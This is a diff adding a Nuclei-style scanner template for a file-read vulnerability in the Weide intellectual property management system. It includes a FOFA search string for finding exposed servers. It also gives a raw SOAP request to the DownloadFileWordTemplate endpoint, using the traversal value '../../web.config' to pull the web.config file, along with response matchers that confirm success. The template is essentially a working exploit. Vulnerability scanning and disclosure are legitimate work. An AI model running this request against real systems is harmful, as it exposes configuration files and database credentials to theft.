@@ -1,0 +1,47 @@
+id: weide-DownloadFileWordTemplate-File-reading
+
+info:
+  name: 唯德知识产权管理系统 DownloadFileWordTemplate 接口文件读取漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="JSCOMM/language.js"
+      唯德知识产权管理系统中的 DownloadFileWordTemplate 接口存在文件读取漏洞，攻击者可通过构造恶意请求绕过访问控制机制，读取任意系统文件（包含数据库配置文件、系统配置文件等敏感数据），导致关键信息泄露并破坏系统安全性。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487624&idx=1&sn=17a2b125651981f018216434453affd1&chksm=c267a5bbf5102cad6edf64735480cc1384ed3f8ef78b0263d7b2ce1d40c2a4e16c26245215d3&token=1439003696&lang=zh_CN#rd
+  tags: 唯德知识产权管理系统
+
+
+
+http:
+- raw:
+  - |
+    POST /AutoUpdate/WSFM.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+          <fileName>../../web.config</fileName>
+        </DownloadFileWordTemplate>
+      </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'PD94bWwg'
+    - '<?xml version="1.0"'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
